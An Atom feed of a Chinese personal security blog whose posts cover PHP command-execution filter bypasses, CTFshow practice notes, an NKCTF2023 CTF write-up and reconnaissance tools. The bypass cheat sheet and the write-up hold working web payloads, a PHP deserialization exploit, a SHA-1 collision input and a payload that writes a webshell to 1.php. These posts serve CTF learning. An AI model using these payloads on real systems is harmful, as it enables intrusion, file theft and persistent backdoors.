<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Robin</title>
  
  <subtitle>LiuGuobin&#39;s blog</subtitle>
  <link href="https://liu1272.github.io/atom.xml" rel="self"/>
  
  <link href="https://liu1272.github.io/"/>
  <updated>2023-04-08T11:46:31.061Z</updated>
  <id>https://liu1272.github.io/</id>
  
  <author>
    <name>liuGuobin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>命令执行</title>
    <link href="https://liu1272.github.io/2023/04/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>https://liu1272.github.io/2023/04/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2023-04-08T11:37:00.000Z</published>
    <updated>2023-04-08T11:46:31.061Z</updated>
    
    <content type="html"><![CDATA[<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>首先看过滤了什么东西，再按照下面的方法一点一点绕过。<br>再利用没过滤的字符构造playload<br>很多是可以泛用的，如果能找到一个很好用的也不错。</p><p>前置知识</p><pre><code>&lt;?=`ls /`;?&gt;等效于&lt;?php echo `ls /`; ?&gt;?cmd=?&gt;&lt;?=`ls \`;闭合第一个php，然后构造第二个短标签形式的phpphp文件上传时，一般是将文件上传到临时目录，然后再将临时目录移到其它地方</code></pre><p>各种绕过手法</p><pre><code>【过滤变量名】重构变量?c=system($_GET[&#39;a&#39;]);&amp;a=cat flag.php;匹配符绕过?c=echo `cat fl&#39;&#39;ag.php`;?c=echo `cat fl/ag.txt`;?c=echo `cat fl*`;【过滤system】system()assert()passthru()exec()           //只执行无回显shell_exec()     // 只执行无回显popen()          // 不会直接返回执行结果，而是返回一个文件指针popen( &#39;whoami &gt;&gt; c:/1.txt&#39;, &#39;r&#39; );proc_open()      //不会直接返回执行结果，而是返回一个文件指针pcntl_exec()call_user_func()还可以写马，也可以tac /fl\ag |tee 1.txt 将返回的内容写入1.txt【过滤cat】more:一页一页的显示档案内容less:与 more 类似head:查看头几行tac:从最后一行开始显示，是 cat 的反向显示tail:查看尾几行nl：显示的时候，顺便输出行号od:以二进制的方式读取档案内容vi:一种编辑器，这个也可以查看vim:一种编辑器，这个也可以查看sort:可以查看uniq:可以查看file -f:报错出具体内容sh /flag 2&gt;%261  //报错出文件内容strings:可以查看rev:反过来看新增一个xxd可以读取文件curl file:///flag 也行bash -v:/etc/passwddate -f:好像可以越权读取文件/bin/cat:/bin/是cat的目录，意思是执行/bin/cat文件,再用?cat代替cat【过滤空格】%09%20$IFS$&#123;IFS&#125;$IFS$9$IFS$1&lt;&lt;&gt;顺便提一句，%09表示的是制表符，而不是空格因为浏览器会自动对特殊字符进行编码所以使用%09表示制表符也是可以被浏览器正确识别的【过滤;】使用?&gt;替换，因为最后一句不用分号include，也就是说应该传入一个文件名include的文件中出错了但是主程序会继续往下执行【过滤括号】使用不用括号的函数(伪协议)?c=php://filter/read=convert.base64-encode/resource=flag.php伪协议也可以重构变量?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php?c=include$_GET[x]?&gt;&amp;x=php://filter/convert.base64-encode/resource=flag.txt【PHP伪协议】file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流【文件按包含漏洞】使用data://协议执行PHP代码?c=data://text/plain,&lt;?php system(&quot;cat fla*&quot;);?&gt;     显示文件源码?c=data://text/plain,&lt;?=system(&#39;tac fl&quot;&quot;ag.php&#39;);?&gt;      查看日志此处让网页直接包含我们写入的代码，从而执行恶意命令但是仍然要绕过对flag的过滤【常用套娃函数】get_defined_vars() 返回一个包含所有已定义变量列表的多维数组array_pop() 是删除并返回数组最后一个元素current() 返回数组中的当前元素的值。别名是pos()next() 返回数组中的下一个元素的值。end()最后一个scandir() 函数返回指定目录中的文件和目录的数组。print_r() 函数用于打印变量，以更容易理解的形式展示。localeconv()函数会返回一一个包含本地数字及货币格式信息的数组（其实就是.）current() 函数返回数组中的当前元素的值。别名是pos()array_reverse() 函数将原数组中的元素顺序翻转，创建新的数组并返回。read_file()  读出源码highlight_file()  读出源码show_source()  读出源码【套娃例子】           要使用POST传参?c=eval(array_pop(next(get_defined_vars())));cmd=system(“cat flag.php”);           不使用POST传参时?c=show_source(next(array_reverse(scandir(pos(localeconv())))));           在COOKIE处传马/?c=show_source(session_id(session_start()));再把PHPSSID值设为flag.php【重定向绕过】system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);       &gt;/dev/null表示将命令的标准输出重定向到/dev/null文件中       2&gt;&amp;1表示将命令的错误输出也重定向到/dev/null       因此不会输出到终端或文件中使用;  &amp;&amp;  %0a  ||等等绕过即可但是要注意所用的PHP版本会影响效果，多试试。【无字母数字的命令执行】/bin/base64以base64加密输出文件所以payload: /?c=/???/????64 ????.???    或者/usr/bin/bzip2将文件压缩为文件名.bz2然后访问payload: /?c=/???/???/????2 ????.???</code></pre><p>文件上传形式的命令执行</p><pre><code>原理是通过POST上传一个文件，文件内容是要执行的命令使用点命令执行该文件时形成条件竞争这个文件默认保存在/tmp/phpxxxx路径下，所以可以通过/???/????????[@-[]来构成这个路径[@-[]为匹配ascii码范围在@-[的字符（A，Z被屏蔽，所以范围大一位）之所以用[@-[]是因为直接用/???/?????????匹配到的其他文件都是小写字母，只有php临时生成的文件才包含大写字母。就算这样，也不一定能够准确地匹配到我们的上传文件，所以可能要多次刷新。POST的参数为?c=.%20/???/????????[@-[]上传下面的内容可以达到命令执行的效果#!  /bin/bashls</code></pre><p>下面是通过或运算构造字符（无字母数字命令执行）<br>通过一些字符互相运算后构造得到我们的payload<br>当异或自增和取反构造字符都无法使用，但是可以用|<br>要求使用POST方式传参，且传入的参数可以直接执行时<br>但是注意尽量使用Python发包，hackbar和BP有时候不是很好用。</p><pre class="line-numbers language-Python"><code class="language-Python">import reimport urllibimport requestsfrom urllib import parse## hex_i = ""# hex_j = ""# pattern='/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&|\-/i'# str1=["system","cat flag.php"]# for p in range(2):#     t1 = ""#     t2 = ""#     for k in str1[p]:#         for i in range(256):#             for j in range(256):#                 if re.search(pattern,chr(i)) :#                     break#                 if re.search(pattern,chr(j)) :#                     continue#                 if i < 16:#                     hex_i = "0" + hex(i)[2:]#                 else:#                     hex_i=hex(i)[2:]#                 if j < 16:#                     hex_j="0"+hex(j)[2:]#                 else:#                     hex_j=hex(j)[2:]#                 hex_i='%'+hex_i#                 hex_j='%'+hex_j#                 c=chr(ord(urllib.parse.unquote(hex_i))|ord(urllib.parse.unquote(hex_j)))#                 if(c ==k):#                     t1=t1+hex_i#                     t2=t2+hex_j#                     break#             else:#                 continue#             break#     payload = "(\""+t1+"\"|\""+t2+"\")"#     print(payload)payload='("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")("%03%01%14%00%06%0c%01%07%00%10%08%10"|"%60%60%60%20%60%60%60%60%2e%60%60%60")'print(payload)data=&#123;    "c":urllib.parse.unquote(payload)&#125;url="http://9fdf5bf0-5dfe-4203-ae04-41501a9f6768.challenge.ctf.show/"re=requests.post(url,data=data)print(re.text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;命令执行&quot;&gt;&lt;a href=&quot;#命令执行&quot; class=&quot;headerlink&quot; title=&quot;命令执行&quot;&gt;&lt;/a&gt;命令执行&lt;/h4&gt;&lt;p&gt;首先看过滤了什么东西，再按照下面的方法一点一点绕过。&lt;br&gt;再利用没过滤的字符构造playload&lt;br&gt;很多是可以泛用的，</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>CTFshow刷题记录</title>
    <link href="https://liu1272.github.io/2023/04/07/CTFshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://liu1272.github.io/2023/04/07/CTFshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2023-04-07T11:51:00.000Z</published>
    <updated>2023-04-08T11:47:24.891Z</updated>
    
    <content type="html"><![CDATA[<h4 id="本文会一直更新，不会分开多个文章记载刷题记录"><a href="#本文会一直更新，不会分开多个文章记载刷题记录" class="headerlink" title="本文会一直更新，不会分开多个文章记载刷题记录"></a>本文会一直更新，不会分开多个文章记载刷题记录</h4><h5 id="文章只记载最简单的最重要的思路"><a href="#文章只记载最简单的最重要的思路" class="headerlink" title="文章只记载最简单的最重要的思路"></a>文章只记载最简单的最重要的思路</h5><h5 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h5><p>既然是信息泄露，自然不会很难，基本上都是工具一把嗦。</p><pre><code>F12robots.txtjs抓包index.phpswww.zip.git.svnindex.php.swpindex.php.bak.index.php.swo.index.php.swn.DS_Store.hg邮箱，电话号码泄露技术文档editor编辑器探针backup.sql/db/db.mdb抓包返回状态</code></pre><h5 id="爆破-BP"><a href="#爆破-BP" class="headerlink" title="爆破(BP)"></a>爆破(BP)</h5><p>爆破简单的用BP完全足够了，难一点的写个Python脚本。</p><pre><code>Payload set         ----&gt;  custom iterator(自定义迭代器)需要进行base64编码  ----&gt;  payload processing 进行编码设置取消Palyload Encoding编码,因为在进行base64加密的时候在最后可能存在 == 会影响base64加密的结果有多重目录的url可以用number爆破出动态地址，同时记得改一下页面index.php</code></pre><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>请查看下一篇文章。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;本文会一直更新，不会分开多个文章记载刷题记录&quot;&gt;&lt;a href=&quot;#本文会一直更新，不会分开多个文章记载刷题记录&quot; class=&quot;headerlink&quot; title=&quot;本文会一直更新，不会分开多个文章记载刷题记录&quot;&gt;&lt;/a&gt;本文会一直更新，不会分开多个文章记载刷题</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>NKCTF2023WP</title>
    <link href="https://liu1272.github.io/2023/03/27/NKCTF2023WP/"/>
    <id>https://liu1272.github.io/2023/03/27/NKCTF2023WP/</id>
    <published>2023-03-27T15:00:00.000Z</published>
    <updated>2023-03-27T17:23:34.473Z</updated>
    
    <content type="html"><![CDATA[<h5 id="前话"><a href="#前话" class="headerlink" title="前话"></a>前话</h5><p>这次CTF比赛对我来说难度感觉适中偏难吧，很多题都是可以写的<br>只是因为比赛是团队合作，所以就把难题留给大哥们了。<br>当然，这不是重点，重点是从中学到了啥。</p><h4 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h4><h5 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h5><p><strong>BabyPHP</strong></p><pre><code>&lt;?php    error_reporting(0);    class Welcome&#123;        public $name;        public $arg = &#39;oww!man!!&#39;;        public function __construct()&#123;            $this-&gt;name = &#39;ItS SO CREAZY&#39;;        &#125;        public function __destruct()&#123;            if($this-&gt;name == &#39;welcome_to_NKCTF&#39;)&#123;                echo $this-&gt;arg;            &#125;        &#125;    &#125;    function waf($string)&#123;        if(preg_match(&#39;/f|l|a|g|\*|\?/i&#39;, $string))&#123;            die(&quot;you are bad&quot;);        &#125;    &#125;    class Happy&#123;        public $shell;        public $cmd;        public function __invoke()&#123;            $shell = $this-&gt;shell;            $cmd = $this-&gt;cmd;            waf($cmd);            eval($shell($cmd));        &#125;    &#125;    class Hell0&#123;        public $func;        public function __toString()&#123;            $function = $this-&gt;func;            $function();        &#125;    &#125;    if(isset($_GET[&#39;p&#39;]))&#123;        unserialize($_GET[&#39;p&#39;]);    &#125;else&#123;        highlight_file(__FILE__);    &#125;?&gt;进行反序列化&lt;?phperror_reporting(0);class Welcome&#123;    public $name;    public $arg;    public function __construct()    &#123;        $this-&gt;name = new Hell0();    &#125;&#125;function waf($string)&#123;    if (preg_match(&#39;/f|l|a|g|\*|\?/i&#39;, $string)) &#123;        die(&quot;you are bad&quot;);    &#125;&#125;class Happy&#123;    public $shell;    public $cmd;    public function __construct()    &#123;        $this-&gt;shell = &#39;system&#39;;        // flag*?        $this-&gt;cmd = &#39;cd /;more `php -r &quot;echo chr(102).chr(49).chr(97).chr(103);&quot;`&#39;;    &#125;    public function __invoke()    &#123;        $shell = $this-&gt;shell;        $cmd = $this-&gt;cmd;        waf($cmd);        eval($shell($cmd));    &#125;&#125;class Hell0&#123;    public $func;    public function __construct()    &#123;        $this-&gt;func = new Happy();    &#125;&#125;$a = new Welcome();echo urlencode(serialize($a));</code></pre><p><strong>EazyPHP</strong></p><pre><code>&lt;?php     highlight_file(__FILE__);    error_reporting(0);    if($_GET[&#39;a&#39;] != $_GET[&#39;b&#39;] &amp;&amp; md5($_GET[&#39;a&#39;]) == md5($_GET[&#39;b&#39;]))&#123;        if((string)$_POST[&#39;c&#39;] != (string)$_POST[&#39;d&#39;] &amp;&amp; sha1($_POST[&#39;c&#39;]) === sha1($_POST[&#39;d&#39;]))&#123;            if($_GET[&#39;e&#39;] != 114514 &amp;&amp; intval($_GET[&#39;e&#39;]) == 114514)&#123;                if(isset($_GET[&#39;NS_CTF.go&#39;]))&#123;                    if(isset($_POST[&#39;cmd&#39;]))&#123;                        if(!preg_match(&#39;/[0-9a-zA-Z]/i&#39;, $_POST[&#39;cmd&#39;]))&#123;                            eval($_POST[&#39;cmd&#39;]);                        &#125;else&#123;                            die(&#39;error!!!!!!&#39;);                        &#125;                    &#125;else&#123;                        die(&#39;error!!!!!&#39;);                    &#125;                &#125;else&#123;                    die(&#39;error!!!!&#39;);                &#125;            &#125;else&#123;                die(&#39;error!!!&#39;);            &#125;        &#125;else&#123;            die(&#39;error!!&#39;);        &#125;    &#125;else&#123;        die(&#39;error!&#39;);    &#125;?&gt; error!其中使用[]通配符绕过c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;cmd=(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%00%06%00&quot;^&quot;%60%60%60%20%2f%60%2a&quot;);</code></pre><p><strong>HardPHP</strong></p><pre><code>&lt;?php// not only ++error_reporting(0);highlight_file(__FILE__);if (isset($_POST[&#39;NKCTF&#39;])) &#123;    $NK = $_POST[&#39;NKCTF&#39;];    if (is_string($NK)) &#123;        if (!preg_match(&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;,$NK) &amp;&amp; strlen($NK) &lt; 105)&#123;            eval($NK);        &#125;else&#123;            echo(&quot;hacker!!!&quot;);        &#125;    &#125;else&#123;        phpinfo();    &#125;&#125;?&gt;【1】利用自增方法NKCTF=$_=(_/_._)[&#39;$&#39;==&#39;_&#39;];$_++;$__=$_.$_++;$_++;$_++;$_++;$__.=$_;$_++;$_=_.$__.$_;$$_[_]($$_[__]);&amp;_=readfile&amp;__=/flag【2】先传ShellNKCTF=%24_%3D(_%2F_._)%5B___%5D%3B%24__%3D%2B%2B%24_%3B%24_____%3D%2B%2B%24_.%24__%3B%2B%2B%24_%2F%2B%2B%24_%3B%24_%3D_.%24_____.%3D%2B%2B%24_.%2B%2B%24_%3B%24%24_%5B___%5D(%24%24_%5B_%5D)%3B&amp;___=shell_exec&amp;_=echo &#39;&lt;?php eval($_POST[1])?&gt;&#39; &gt;1.php     再输出FLAG1=echo file_get_contents(&#39;/flag&#39;);</code></pre><p><strong>EasyPMS</strong></p><pre><code>禅道系统存在命令执行和权限绕过漏洞，根据0Day漏洞的POC执行就行了</code></pre><h5 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h5><p><strong>Blue取证磁盘</strong></p><pre><code>【预期解】使用永恒之蓝攻击【非预期解】虚拟机直接导入先扫出IP地址使用nmap尝试扫描其他smb漏洞      nmap -P --script=smb-vuln*  IP利用ms09的CVE获取Shell然后打开【严重非预期解】WinHex一把嗦</code></pre><p><strong>三体</strong><br><a href="https://www.bilibili.com/video/BV1Ai4y1V7rg/">老题目了</a></p><pre><code>from PIL import Imagedef decode(im):    width, height = im.size    lst = [ ]    for y in range(height):        for x in range(width):            red, green, blue = im.getpixel((x, y))            if (blue | green | red) == 0:                break                        index = (green &lt;&lt; 8) + blue            lst.append( chr(index) )    return &#39;&#39;.join(lst)def main(filename: str):    all_text = decode(Image.open(filename))    with open(&quot;&#123;&#125;_decode.txt&quot;.format(&#39;.&#39;.join(filename.split(&#39;.&#39;)[:-1])), &quot;w&quot;, encoding = &quot;utf-8&quot;) as f:        f.write(all_text)if __name__ == &#39;__main__&#39;:    main(&#39;三体.bmp&#39;)</code></pre><p><strong>THMaster东方星莲船打到10亿分</strong></p><pre><code>【1】简简单单网上找修改器改分数【2】CheatEngine修改游戏数据</code></pre><p><strong>easy_rgb</strong></p><pre><code>用Kali的工具gaps具体指令自己网上找然后发现三个文档r.txt   g.txt   b.txt按照rgb的顺序每次读一位字符得到压缩包字节流r = &quot;5b04000d663f400000006c6e747a434fbc7d0225c4060b2905cf0a280807372873460041100000ba56b200000000000000006c6e7400000110ea63055a596785d14500010000600745213&quot;g = &quot;0040000ba56b2000000066778f4ac280276f9fb28fb3c282b4fdf7d8a0944bc722bd65b0410083a5492004008200000000006677800000008cc73d1c7630a5f595b000001500800015d38&quot;b = &quot;4310083a54920040080061247309bcac200235fff7778acdfc0401090b3a37c1fcf3000204000d663f40000004000020000061247a20000004dd5985a5d14663000600000a0000004332&quot;data = &quot;&quot;for i in range(len(r)):    try:        data += r[i] + g[i] + b[i]    except:        breakdata += r[-1] + g[-1]with open(&#39;flag.zip&#39;, &#39;wb&#39;) as f:    f.write(bytes.fromhex(data))</code></pre><p><strong>easy_word</strong></p><pre><code>提示如下:小明这个笨蛋，给文档设置了一个密码，但是他自己却忘记了密码，他知道以下信息：1.密码是数学和大小写英语的随机生成的2.hash函数：输出大小 256 bits 内部大小 256 区块大小    512 长度大小 64 字符尺寸 323.密码：h??vO??0 (?号部分为小明已经忘记的位置)  哈希：b75d1224 ... (后面不记得了...)写脚本跑一下import hashlibchars = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;for c1 in chars:    for c2 in chars:        for c3 in chars:            for c4 in chars:                password = &quot;h&#123;&#125;&#123;&#125;vO&#123;&#125;&#123;&#125;0&quot;.format(c1, c2, c3, c4)                hashcode = hashlib.sha256(password.encode()).hexdigest()                if hashcode[:8] == &quot;b75d1224&quot;:                    print(&quot;&#123;&#125;   &#123;&#125;&quot;.format(password, hashcode))                    h4evOF90   b75d1224d1321f5acfe0fb499ff02ab0f15d199e227c77c84c1162340bc6c771发现有一个图片猜测是LSB，直接解密</code></pre><p><strong>first_spam_of_rabbit_year</strong></p><pre><code>文档底下的社会主义核心价值观编码解码为：rabbit 又 move再用佛又曰得出的文本有不可显示字符零宽解密   https://offdev.net/demos/zwsp-steg-js将key和密文清除零宽后分别解密得到新密文最后用rabbit解密   https://www.codeeeee.com/encrypt/rabbit.html</code></pre><p><strong>easy_bmp</strong></p><pre><code>修改宽并使用脚本爆破高显示出部分key解压出一个二维码扫得flag</code></pre><p><strong>baby_music</strong></p><pre><code>WinHex打开发现全是1027和1127盲猜是二进制数据，把1027改为0,1127改为1得到一个zip，里面有脚本压缩包的提示为摩斯密码猜测明文攻击 echo -n &quot;89504E470D0A1A0A0000000D49484452&quot; | xxd -r -ps &gt; png_header</code></pre><p><strong>easymusic</strong></p><pre><code>提示OpenPuff，需要三个密码用notepad++打开音频文件发现第一个密码Kali安装Audacity选择spectrogram进行频谱分析得到一个密码选择波形分析，发现对应二进制的01变化，高电平表示1，低电平表示0，二进制数转换成字符串得到第三个密码最后提取出隐藏Flag</code></pre><p><strong>easy_pic</strong></p><pre><code>formast分离出一个图片010编辑器分析出隐藏数据得到一个照片PS更改宽高得到隐藏Flag</code></pre><h5 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h5><p><strong>Signin</strong><br>不会。</p><h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>反正感觉这次比赛还是有很大作用的，以后继续努力（敷衍中，睡觉了）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;前话&quot;&gt;&lt;a href=&quot;#前话&quot; class=&quot;headerlink&quot; title=&quot;前话&quot;&gt;&lt;/a&gt;前话&lt;/h5&gt;&lt;p&gt;这次CTF比赛对我来说难度感觉适中偏难吧，很多题都是可以写的&lt;br&gt;只是因为比赛是团队合作，所以就把难题留给大哥们了。&lt;br&gt;当然，这不是重</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>说点啥好呢？</title>
    <link href="https://liu1272.github.io/2023/03/21/%E8%AF%B4%E7%82%B9%E5%95%A5%E5%A5%BD%E5%91%A2%EF%BC%9F/"/>
    <id>https://liu1272.github.io/2023/03/21/%E8%AF%B4%E7%82%B9%E5%95%A5%E5%A5%BD%E5%91%A2%EF%BC%9F/</id>
    <published>2023-03-20T16:38:00.000Z</published>
    <updated>2023-03-20T16:38:58.121Z</updated>
    
    <content type="html"><![CDATA[<p><strong>我现在在写的文章是一个完整的系列，也是我学习的路线。</strong><br><strong>如果你有仔细看就会发现它一开始就不是针CTF竞赛的。</strong><br><strong>所以这个系列（或许可以这么说吧哈哈）很大概率会持续更新下去。</strong><br><strong>对于下个部分的内容，我在考虑</strong><br><strong>是<code>穷举篇</code>还是<code>SQL注入绕过技术篇</code>还是<code>文件上传篇</code>。</strong><br><strong>反正到时候写出来就知道了。</strong><br><strong>还有，我对待这个博客仍然是个人博客的态度</strong><br><strong>不指望也不希望太多人传之类的。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;我现在在写的文章是一个完整的系列，也是我学习的路线。&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;如果你有仔细看就会发现它一开始就不是针CTF竞赛的。&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;所以这个系列（或许可以这么说吧哈哈）很大概率会持续更新下去。&lt;/str</summary>
      
    
    
    
    <category term="闲聊" scheme="https://liu1272.github.io/categories/%E9%97%B2%E8%81%8A/"/>
    
    
    <category term="闲聊" scheme="https://liu1272.github.io/tags/%E9%97%B2%E8%81%8A/"/>
    
  </entry>
  
  <entry>
    <title>说点啥好呢？</title>
    <link href="https://liu1272.github.io/2023/03/21/%E7%8A%B9%E8%B1%AB/"/>
    <id>https://liu1272.github.io/2023/03/21/%E7%8A%B9%E8%B1%AB/</id>
    <published>2023-03-20T16:29:47.000Z</published>
    <updated>2023-03-20T16:38:31.964Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>信息收集概述</title>
    <link href="https://liu1272.github.io/2023/03/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%A6%82%E8%BF%B0/"/>
    <id>https://liu1272.github.io/2023/03/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%A6%82%E8%BF%B0/</id>
    <published>2023-03-20T15:45:00.000Z</published>
    <updated>2023-03-20T16:29:34.560Z</updated>
    
    <content type="html"><![CDATA[<h4 id="一些基本概念"><a href="#一些基本概念" class="headerlink" title="一些基本概念"></a>一些基本概念</h4><p>旁站：是和目标网站在同一台服务器上的其它的网站。<br>C段：是和目标服务器ip处在同一个C段的其它服务器。<br>ARL资产侦查灯塔：快速发现并整理企业外网资产并为资产构建基础数据库的工具（想要的自己找）</p><h4 id="收集操作"><a href="#收集操作" class="headerlink" title="收集操作"></a>收集操作</h4><p>Whois操作<br>Kali系统中，Whois己经默认安装，只需输入要查询的域名即可</p><pre><code>whois  +  域名（一般域名不包含主机名，如·baidu.com）</code></pre><p>网站查询及反查<br><a href="https://whois.chinaz.com/">站长之家</a><br><a href="https://site.ip138.com/">IP查询网</a><br><a href="https://whois.aliyun.com/">阿里云查询</a></p><p>备案查询<br><a href="https://www.beianx.cn/">ICP备案查询网</a><br><a href="http://www.tianyancha.como/">天眼查</a></p><p>收集子域名信息<br><a href="https://searchdns.netcraft.com/">网站查询</a><br><a href="https://dnsdumpster.com/">DNSdumpster网站查询</a></p><p>通过查看网站的证书</p><p>利用域传送漏洞</p><pre><code>原理:一台备用服务器使用来自主服务器的数据刷新系的域（zone）数据库     但许多DNS服务器却被错误地配置成只要有client发出请求     就会向对方提供一个zone数据库的详细信息（没有身份认证）利用:（1）Kali的dig工具             dig axfr @DNS服务器 要查询的域名     （2）nslookup工具     （3）nmap工具</code></pre><p>子域名检测</p><pre><code>（1）Layer子域名挖掘机（2）K8（3）wydomain（4）Sublist3r dnsmaper（5）subDomainsBrute（6）Maltego CE（7）dnsrecon(kali自带)重点推荐Layer子域名挖掘机、Sublist3r和subDomainsBrute</code></pre><p>证书透明度公开曰志枚举</p><pre><code>（1）首推好用网站：https://crt.sh（2）次推好用网站：https://censys.io/（3）其他网站：https://phpinfo.me/domain</code></pre><p>通过DNS解析找到IP地址</p><pre><code>（1）ping（2）nslookup（3）dig工具（4）dnsenum工具（5）站长之家</code></pre><p>谷歌搜索（其实百度也还行）</p><pre><code>关键字            说明site            指定域名inurl           URL 中存在关键字的网页intext          网页正文中的关键字filetype        指定文件类型intitie         网页标题中的关键字link            link:baidu.com 即表示返回所有和 baidu.com 做了链接的URLinfo            查找指定站点的一些基本信息cache           搜索Google 里关于某些内容的缓存关键字尽量用“”引起来    </code></pre><p>网络空间搜索引擎（AMAZING MIGHTYYYY!!!!）<br><a href="https://www.zoomeye.org/">钟馗之眼zoomeye</a><br><a href="https://www.shodan.io/">傻蛋Shodan</a><br><a href="https://fofa.info/">佛法FOFA</a></p><p>CMS及Web指纹识别</p><pre><code>御剑Web 指纹识别、WebRobo 、椰树、轻量WEB指纹识别建议WhatWeb（Kali自带）</code></pre><p><a href="http://whatweb.bugscaner.com/look/">BugScaner</a><br><a href="http://www.yunsee.cn/finger.html">云悉指纹</a><br><a href="https://whatweb.net/">WhatWeb</a></p><p>收集网站目录及隐藏的敏感文件</p><pre><code>（1）DirBuster（2）御剑后台扫描珍藏版（3）wwwscan（4）Spinder.py（5）Sensitivefilescan（6）Weakfilescan</code></pre><h5 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h5><p>自己想办法。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p><strong>无论人生上了哪一层台阶 